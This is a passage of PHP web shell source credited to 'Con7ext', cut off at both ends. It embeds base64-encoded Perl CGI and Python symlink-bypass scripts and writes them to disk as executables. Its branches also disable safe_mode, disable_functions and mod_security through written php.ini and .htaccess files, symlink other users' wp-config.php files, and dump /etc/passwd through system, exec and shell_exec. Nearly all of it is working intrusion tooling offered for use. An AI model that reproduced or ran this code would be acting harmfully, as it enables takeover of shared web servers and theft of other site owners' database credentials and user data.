nJHN0eWxlJz4NCg0KCQkJPHRkIGlkPSdGaWxlXyRpJyBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPjxhICBocmVmPSc/YT1ndWkmZD0iLiRkLiInPlsgIi4kZGlybmFtZS4iIF08L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPkRJUjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlT3duZXIoJGQpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgaWQ9J0ZpbGVQZXJtc18kaScgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOycgb25kYmxjbGljaz1cInJtX2NobW9kX2Zvcm0odGhpcywiLiRpLiIsJyIuJkZpbGVQZXJtcygkZCkuIicsJyIuJGRpcm5hbWUuIicpXCIgPjxzcGFuIG9uY2xpY2s9XCJjaG1vZF9mb3JtKCIuJGkuIiwnIi4kZGlybmFtZS4iJylcIiA+Ii4mRmlsZVBlcm1zKCRkKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlTGFzdE1vZGlmaWVkKCRkKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZGlybmFtZScsJyIuJkFkZFNsYXNoZXMoJkFkZFNsYXNoZXMoJGQpKS4iJylcIj5SZW5hbWU8L2E+ICB8IDxhIG9uY2xpY2s9XCJpZighY29uZmlybSgnUmVtb3ZlIGRpcjogJGRpcm5hbWUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9JHBhdGgmcmVtb3ZlPSRkaXJuYW1lJz5SZW1vdmU8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPC90cj4iOw0KCQkJJGkrKzsNCgkJfQ0KCQlmb3JlYWNoIG15ICRmIChAZm5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZmlsZT0kZjsNCgkJCSRmID0gJHBhdGguJGY7DQoJCQkkdmlldyA9ICI/ZGlyPSIuJHBhdGguIiZ2aWV3PSIuJGY7DQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+PHRkIGlkPSdGaWxlXyRpJyBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyc+PGEgaHJlZj0nP2E9Y29tbWFuZCZkPSIuJHBhdGguIiZjPWVkaXQlMjAiLiRmaWxlLiInPiIuJGZpbGUuIjwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+Ii4mUGFyc2VGaWxlU2l6ZSgmRmlsZVNpemUoJGYpKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPiIuJkZpbGVPd25lcigkZikuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7JyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRmKS4iJywnIi4kZmlsZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oJGksJyRmaWxlJylcIiA+Ii4mRmlsZVBlcm1zKCRmKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlTGFzdE1vZGlmaWVkKCRmKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0iLiRwYXRoLiImYz1lZGl0JTIwIi4kZmlsZS4iJz5FZGl0PC9hPiB8IDxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZmlsZScsJ2YnKVwiPlJlbmFtZTwvYT4gfCA8YSBocmVmPSc/YT1kb3dubG9hZCZvPWdvJmY9Ii4kZi4iJz5Eb3dubG9hZDwvYT4gfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1JlbW92ZSBmaWxlOiAkZmlsZSA/JykpIHsgcmV0dXJuIGZhbHNlO31cIiBocmVmPSc/YT1ndWkmZD0kcGF0aCZyZW1vdmU9JGZpbGUnPlJlbW92ZTwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8L3RyPiI7DQoJCQkkaSsrOw0KCQl9DQoJCSRyZXN1bHQgLj0gIjwvdGFibGU+PC9kaXY+IjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRyeSB0byBWaWV3IExpc3QgVXNlcg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFZpZXdEb21haW5Vc2VyDQp7DQoJb3BlbiAoZG9tYWlucywgJy9ldGMvbmFtZWQuY29uZicpIG9yICRlcnI9MTsNCglteSBAY256cyA9IDxkb21haW5zPjsNCgljbG9zZSBkMG1haW5zOw0KCW15ICRzdHlsZT0ibGluZSI7DQoJbXkgJHJlc3VsdD0iPGg1Pjxmb250IHN0eWxlPSdmb250OiAxNXB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz5Ib2FuZyBTYSAtIFRydW9uZyBTYTwvZm9udD48L2g1PiI7DQoJaWYgKCRlcnIpDQoJew0KCQkkcmVzdWx0IC49ICAoJzxwPkMwdWxkblwndCBCeXBhc3MgaXQgLCBTb3JyeTwvcD4nKTsNCgkJcmV0dXJuICRyZXN1bHQ7DQoJfWVsc2UNCgl7DQoJCSRyZXN1bHQgLj0gJzx0YWJsZT48dHI+PHRoPkRvbWFpbnM8L3RoPiA8dGg+VXNlcjwvdGg+PC90cj4nOw0KCX0NCglmb3JlYWNoIG15ICRvbmUgKEBjbnpzKQ0KCXsNCgkJaWYoJG9uZSA9fiBtLy4qP3pvbmUgIiguKj8pIiB7LykNCgkJewkNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZmlsZW5hbWU9ICIvZXRjL3ZhbGlhc2VzLyIuJG9uZTsNCgkJCSRvd25lciA9IGdldHB3dWlkKChzdGF0KCRmaWxlbmFtZSkpWzRdKTsNCgkJCSRyZXN1bHQgLj0gJzx0ciBjbGFzcz0iJHN0eWxlIiB3aWR0aD01MCU+PHRkPicuJG9uZS4nIDwvdGQ+PHRkPiAnLiRvd25lci4nPC90ZD48L3RyPic7DQoJCX0NCgl9DQoJJHJlc3VsdCAuPSAnPC90YWJsZT4nOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBWaWV3IExvZw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFZpZXdMb2cNCnsNCglpZigkV2luTlQpDQoJew0KCQlyZXR1cm4gIjxoMj48Zm9udCBzdHlsZT0nZm9udDogMjBwdCBWZXJkYW5hO2NvbG9yOiAjZmY5OTAwOyc+RG9uJ3QgcnVuIG9uIFdpbmRvd3M8L2ZvbnQ+PC9oMj4iOw0KCX0NCglteSAkcmVzdWx0PSI8dGFibGU+PHRyPjx0aD5QYXRoIExvZzwvdGg+PHRoPlN1Ym1pdDwvdGg+PC90cj4iOw0KCW15IEBwYXRobG9nPSgNCgkJCQknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9lcnJvcl9sb2cnLA0KCQkJCScvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2cnLA0KCQkJCScvdXNyL2xvY2FsL2FwYWNoZS9sb2dzL2FjY2Vzc19sb2cnDQoJCQkJKTsNCglteSAkaT0wOw0KCW15ICRwZXJtczsNCglteSAkc2w7DQoJZm9yZWFjaCBteSAkbG9nIChAcGF0aGxvZykNCgl7DQoJCWlmKC13ICRsb2cpDQoJCXsNCgkJCSRwZXJtcz0iT0siOw0KCQl9ZWxzZQ0KCQl7DQoJCQljaG9wKCRzbCA9IGBsbiAtcyAkbG9nIGVycm9yX2xvZ18kaWApOw0KCQkJaWYoJnRyaW0oJGxzKSBlcSAiIikNCgkJCXsNCgkJCQlpZigtciAkbHMpDQoJCQkJew0KCQkJCQkkcGVybXM9Ik9LIjsNCgkJCQkJJGxvZz0iZXJyb3JfbG9nXyIuJGk7DQoJCQkJfQ0KCQkJfWVsc2UNCgkJCXsNCgkJCQkkcGVybXM9Ijxmb250IHN0eWxlPSdjb2xvcjogcmVkOyc+Q2FuY2VsPGZvbnQ+IjsNCgkJCX0NCgkJfQ0KCQkkcmVzdWx0IC49PDxFTkQ7DQoJCTx0cj4NCg0KCQkJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQoJCQk8dGQ+PGlucHV0IHR5cGU9InRleHQiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dfJGknKS52YWx1ZT0nbGVzcyAnICsgdGhpcy52YWx1ZTsiIHZhbHVlPSIkbG9nIiBzaXplPSc1MCcvPjwvdGQ+DQoJCQk8dGQ+PGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IlRyeSIgLz48L3RkPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgaWQ9ImxvZ18kaSIgbmFtZT0iYyIgdmFsdWU9Imxlc3MgJGxvZyIvPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiIC8+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiIC8+DQoJCQk8L2Zvcm0+DQoJCQk8dGQ+JHBlcm1zPC90ZD4NCg0KCQk8L3RyPg0KRU5EDQoJCSRpKys7DQoJfQ0KCSRyZXN1bHQgLj0iPC90YWJsZT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBNYWluIFByb2dyYW0gLSBFeGVjdXRpb24gU3RhcnRzIEhlcmUNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiZSZWFkUGFyc2U7DQomR2V0Q29va2llczsNCg0KJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsNCiRTZXJ2ZXJOYW1lID0gJEVOVnsnU0VSVkVSX05BTUUnfTsNCiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCiRBY3Rpb24gPSAkaW57J2EnfTsNCg0KJEFjdGlvbiA9ICJjb21tYW5kIiBpZigkQWN0aW9uIGVxICIiKTsgIyBubyBhY3Rpb24gc3BlY2lmaWVkLCB1c2UgZGVmYXVsdA0KDQojIGdldCB0aGUgZGlyZWN0b3J5IGluIHdoaWNoIHRoZSBjb21tYW5kcyB3aWxsIGJlIGV4ZWN1dGVkDQokQ3VycmVudERpciA9ICZ0cmltKCRpbnsnZCd9KTsNCiMgbWFjIGRpbmggeHVhdCB0aG9uZyB0aW4gbmV1IGtvIGNvIGxlbmggbmFvIQ0KJFJ1bkNvbW1hbmQ9ICRXaW5OVD8iZGlyIjoiZGlyIC1saWEiIGlmKCRSdW5Db21tYW5kIGVxICIiKTsNCmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCg0KJExvZ2dlZEluID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOw0KDQppZigkQWN0aW9uIGVxICJsb2dpbiIgfHwgISRMb2dnZWRJbikgCQkjIHVzZXIgbmVlZHMvaGFzIHRvIGxvZ2luDQp7DQoJJlBlcmZvcm1Mb2dpbjsNCn1lbHNpZigkQWN0aW9uIGVxICJndWkiKSAjIEdVSSBkaXJlY3RvcnkNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCWlmKCEkV2luTlQpDQoJew0KCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCWlmKCEoJGNobW9kIGVxIDApKQ0KCQl7DQoJCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCQkkZmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCQkJY2hvcCgkcmVzdWx0PSBgY2htb2QgJGNobW9kICIkZmlsZSJgKTsNCgkJCWlmKCZ0cmltKCRyZXN1bHQpIGVxICIiKQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBEb25lISA8L3J1bj48YnI+IjsNCgkJCX1lbHNlDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IFNvcnJ5ISBZb3UgZG9udCBoYXZlIHBlcm1pc3Npb25zISA8L3J1bj48YnI+IjsNCgkJCX0NCgkJfQ0KCX0NCgkkcmVuYW1lPSRpbnsncmVuYW1lJ307DQoJaWYoISRyZW5hbWUgZXEgIiIpDQoJew0KCQlpZihyZW5hbWUoJFRyYW5zZmVyRmlsZSwkcmVuYW1lKSkNCgkJew0KCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQl9ZWxzZQ0KCQl7DQoJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQl9DQoJfQ0KCSRyZW1vdmU9JGlueydyZW1vdmUnfTsNCglpZigkcmVtb3ZlIG5lICIiKQ0KCXsNCgkJJHJtID0gJEN1cnJlbnREaXIuJFBhdGhTZXAuJHJlbW92ZTsNCgkJaWYoLWQgJHJtKQ0KCQl7DQoJCQkmUm1EaXIoJHJtKTsNCgkJfWVsc2UNCgkJew0KCQkJaWYodW5saW5rKCRybSkpDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQkJfWVsc2UNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQkJfQkJCQ0KCQl9DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KDQp9DQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCglwcmludCAmRXhlY3V0ZUNvbW1hbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJzYXZlIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gc2F2ZSBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCWlmKCZTYXZlRmlsZSgkaW57J2RhdGEnfSwkaW57J2ZpbGUnfSkpDQoJew0KCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJfWVsc2UNCgl7DQoJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgCQkJCQkjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQ0Kew0KCSZQcmludFBhZ2VIZWFkZXI7DQoNCglwcmludCAmVXBsb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImJhY2tiaW5kIikgCQkJCSMgdXNlciB3YW50cyB0byBiYWNrIGNvbm5lY3Qgb3IgYmluZCBwb3J0DQp7DQoJJlByaW50UGFnZUhlYWRlcigiY2xpZW50cG9ydCIpOw0KCXByaW50ICZCYWNrQmluZDsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImJydXRlZm9yY2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIGJydXRlIGZvcmNlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmQnJ1dGVGb3JjZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KCXByaW50ICZEb3dubG9hZEZpbGU7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiY2hlY2tsb2ciKSAJCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbG9nIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCXByaW50ICZWaWV3TG9nOw0KDQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG9tYWluc3VzZXIiKSAJCQkjIHVzZXIgd2FudHMgdG8gdmlldyBsaXN0IHVzZXIvZG9tYWluDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmVmlld0RvbWFpblVzZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgCQkJCSMgdXNlciB3YW50cyB0byBsb2dvdXQNCnsNCgkmUGVyZm9ybUxvZ291dDsNCn0NCiZQcmludFBhZ2VGb290ZXI7";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='con7ext_cgi/cgi.con7ext' target='_blank'>Klik Here</a>";
}elseif($_GET['symlink'] == 'python') {
	$sym_dir = mkdir('con7ext_sympy', 0755);
        chdir('con7ext_sympy');
	$file_sym = "sym.py";
	$sym_script = "Iy8qUHl0aG9uDQoNCmltcG9ydCB0aW1lDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCByZQ0KDQpvcy5zeXN0ZW0oImNvbG9yIEMiKQ0KDQpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIg0KZiA9ICJBbGwgUHJvY2Vzc2VzIERvbmUhXG5TeW1saW5rIEJ5cGFzc2VkIFN1Y2Nlc3NmdWxseSFcbiINCnByaW50ICJcbiINCnByaW50ICJ+Iio2MA0KcHJpbnQgIlN5bWxpbmsgQnlwYXNzIDIwMTQgYnkgTWluZGxlc3MgSW5qZWN0b3IgIg0KcHJpbnQgIiAgICAgICAgICAgICAgU3BlY2lhbCBHcmVldHogdG8gOiBQYWsgQ3liZXIgU2t1bGx6Ig0KcHJpbnQgIn4iKjYwDQoNCm9zLm1ha2VkaXJzKCdicnVkdWxzeW1weScpDQpvcy5jaGRpcignYnJ1ZHVsc3ltcHknKQ0KDQpzdXNyPVtdDQpzaXRleD1bXQ0Kb3Muc3lzdGVtKCJsbiAtcyAvIGJydWR1bC50eHQiKQ0KDQpoID0gIk9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rc1xuRGlyZWN0b3J5SW5kZXggYnJ1ZHVsLnBodG1sXG5BZGRUeXBlIHR4dCAucGhwXG5BZGRIYW5kbGVyIHR4dCAucGhwIg0KbSA9IG9wZW4oIi5odGFjY2VzcyIsIncrIikNCm0ud3JpdGUoaCkNCm0uY2xvc2UoKQ0KcHJpbnQgaHRhDQoNCnNmID0gIjxodG1sPjx0aXRsZT5TeW1saW5rIFB5dGhvbjwvdGl0bGU+PGNlbnRlcj48Zm9udCBjb2xvcj13aGl0ZSBzaXplPTU+U3ltbGluayBCeXBhc3MgMjAxNzxicj48Zm9udCBzaXplPTQ+TWFkZSBCeSBNaW5kbGVzcyBJbmplY3RvciA8YnI+UmVjb2RlZCBCeSBDb243ZXh0PC9mb250PjwvZm9udD48YnI+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zPjx0YWJsZT4iDQoNCm8gPSBvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3InKQ0Kbz1vLnJlYWQoKQ0KbyA9IHJlLmZpbmRhbGwoJy9ob21lL1x3KycsbykNCg0KZm9yIHh1c3IgaW4gbzoNCgl4dXNyPXh1c3IucmVwbGFjZSgnL2hvbWUvJywnJykNCglzdXNyLmFwcGVuZCh4dXNyKQ0KcHJpbnQgIi0iKjMwDQp4c2l0ZSA9IG9zLmxpc3RkaXIoIi92YXIvbmFtZWQiKQ0KDQpmb3IgeHhzaXRlIGluIHhzaXRlOg0KCXh4c2l0ZT14eHNpdGUucmVwbGFjZSgiLmRiIiwiIikNCglzaXRleC5hcHBlbmQoeHhzaXRlKQ0KcHJpbnQgZg0KcGF0aD1vcy5nZXRjd2QoKQ0KaWYgIi9wdWJsaWNfaHRtbC8iIGluIHBhdGg6DQoJcGF0aD0iL3B1YmxpY19odG1sLyINCmVsc2U6DQoJcGF0aCA9ICIvaHRtbC8iDQpjb3VudGVyPTENCmlwcz1vcGVuKCJicnVkdWwucGh0bWwiLCJ3IikNCmlwcy53cml0ZShzZikNCg0KZm9yIGZ1c3IgaW4gc3VzcjoNCglmb3IgZnNpdGUgaW4gc2l0ZXg6DQoJCWZ1PWZ1c3JbMDo1XQ0KCQlzPWZzaXRlWzA6NV0NCgkJaWYgZnU9PXM6DQoJCQlpcHMud3JpdGUoIjxib2R5IGJnY29sb3I9YmxhY2s+PHRyPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6d2hpdGU7PiVzPC90ZD48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkO2NvbG9yOnJlZDs+JXM8L3RkPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7PjxhIGhyZWY9YnJ1ZHVsLnR4dC9ob21lLyVzJXMgdGFyZ2V0PV9ibGFuayA+JXM8L2E+PC90ZD4iJShjb3VudGVyLGZ1c3IsZnVzcixwYXRoLGZzaXRlKSkNCgkJCWNvdW50ZXI9Y291bnRlcisx";
        $sym = fopen($file_sym, "w");
	fwrite($sym, base64_decode($sym_script));
	chmod($file_sym, 0755);
        $jancok = exe("python sym.py");
	echo "<br><center>Done ... <a href='con7ext_sympy/brudulsympy/' target='_blank'>Klik Here</a>";
} elseif($_GET['bypass'] == 'disablefunc'){
		echo "<br><br><center>";
		echo "<form method=post><input type=submit name=ini value='php.ini' />&nbsp;<input type=submit name=htce value='.htaccess' />&nbsp;<input type=submit name=litini value='Litespeed' /></form>";
		if(isset($_POST['ini']))
{
		$file = fopen("php.ini","w");
		echo fwrite($file,"disable_functions=none
safe_mode = Off
	");
		fclose($file);
		echo "<a href='php.ini'>click here!</a>";
}		if(isset($_POST['htce']))
{
		$file = fopen(".htaccess","w");
		echo fwrite($file,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
	");
		fclose($file);
		echo "htaccess successfully created!";
}               if(isset($_POST['litini'])){
		$iniph = '<? n echo ini_get("safe_mode"); n echo ini_get("open_basedir"); n include($_GET["file"]); n ini_restore("safe_mode"); n ini_restore("open_basedir"); n echo ini_get("safe_mode"); n echo ini_get("open_basedir"); n include($_GET["ss"]; n ?>';
			 $byph = "safe_mode = Off n disable_functions= ";
		$comp="PEZpbGVzICoucGhwPg0KRm9yY2VUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtcGhwNA0KPC9GaWxlcz4=";
		file_put_contents("php.ini",base64_decode($byph));
		file_put_contents("ini.php",base64_decode($iniph));
		file_put_contents(".htaccess",base64_decode($comp));
		echo "<script>alert('Disable Functions in Litespeed Created'); hideAll();</script>";
		echo"</center>";
}
} elseif ($_GET['symlink'] == '404'){
@error_reporting(0);
@ini_set('display_errors', 0); 
echo '<center><b><a href="https://www.facebook.com/rinto2234">Coded By Con7ext</a></b><br>
<form method="post"><br>File Target : <input name="dir" value="/home/user/public_html/wp-config.php">
<br>
<br>Save As: <input name="jnck" value="ojayakan.txt"><input name="ojaykan" type="submit" value="Eksekusi Gan"></form><br>';
if($_POST['ojaykan']){
rmdir("con7ext_symlink404");mkdir("con7ext_symlink404", 0777);
$dir = $_POST['dir'];
$jnck = $_POST['jnck'];
system("ln -s ".$dir." con7ext_symlink404/".$jnck);
symlink($dir,"con7ext_symlink404/".$jnck);
$inija = fopen("con7ext_symlink404/.htaccess", "w");
fwrite($inija,"ReadmeName ".$jnck."
Options Indexes FollowSymLinks
DirectoryIndex ngeue.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
");
echo'<a href="con7ext_symlink404/" target="_blank">Klik Gan >:(</a>';
}
}elseif($_GET['bypass'] == 'passwd') {
	echo '<br><br><center>Bypass etc/passw With:<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass User With : <table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';


if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
} elseif($_GET['kill'] == 'self') {
	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('<center><br><center><h2>Shell removed</h2><br>Goodbye , Thanks for take my shell today</center></center>');
		else
			echo '<center>unlink failed!</center>';
}
elseif($_GET['symlink'] == 'server') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("con7ext_sym",0777);
@chdir("con7ext_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
